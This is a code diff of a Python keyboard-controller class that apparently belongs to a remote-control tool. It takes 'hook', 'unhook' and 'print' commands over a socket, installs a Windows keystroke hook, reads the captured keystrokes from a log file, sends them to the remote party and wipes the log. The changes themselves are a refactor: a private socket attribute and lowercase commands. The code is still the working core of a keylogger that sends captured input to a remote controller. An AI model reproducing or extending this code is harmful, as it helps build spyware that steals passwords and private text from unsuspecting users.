@@ -5,7 +5,7 @@ import threading
 
 class keyboardController():
     def __init__(self, clientSocket):
-        self.client = clientSocket
+        self.__client = clientSocket
         self.HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
         self.keyhook = KeyLog.KeyHook()
 
@@ -23,16 +23,17 @@ class keyboardController():
     def keyStroke(self):
         request = ""
         while True:
-            request = self.client.recv(1024).decode("utf-8")
+            request = self.__client.recv(1024).decode("utf-8")
             if not request:
                 break
-            if request == "Hook":
+            if request == "hook":
                 self.hookKey()
-            elif request == "Unhook":
+            elif request == "unhook":   
                 self.unhookKey()
-            elif request == "Print":
+            elif request == "print":
                 self.printKey()
             else: #Quit
+                self.unhookKey()
                 return
 
     def hookKey(self):
@@ -52,13 +53,13 @@ class keyboardController():
         f.close()
         if s=="": 
             ss = "No"
-            self.client.sendall(ss.encode('utf-8'))
+            self.__client.sendall(ss.encode('utf-8'))
         else:
             ss = "Yes"
-            self.client.sendall(ss.encode('utf-8'))
-            check = self.client.recv(10)
+            self.__client.sendall(ss.encode('utf-8'))
+            check = self.__client.recv(10)
             open(KeyLog.FilLogPath, "w")
-            self.client.sendall(s.encode('utf-8'))
+            self.__client.sendall(s.encode('utf-8'))
 
     def lockKeyboard():
         while True:
